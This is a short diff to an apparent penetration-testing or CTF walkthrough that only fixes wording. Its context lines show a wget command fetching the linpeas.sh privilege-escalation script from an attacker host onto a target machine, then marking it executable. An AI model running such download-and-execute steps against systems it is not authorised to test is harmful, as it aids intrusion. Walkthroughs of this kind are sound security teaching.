@@ -143,7 +143,7 @@ And from the target machine we can use “wget” to download linpeas.
 wget http://host_ip_address:port/linpeas.sh
 ```
 
-After uploading the linpeas we need to give execute permission:
+After uploading linpeas we need to give execute permission:
 
 ```
 chmod +x linpeas.sh
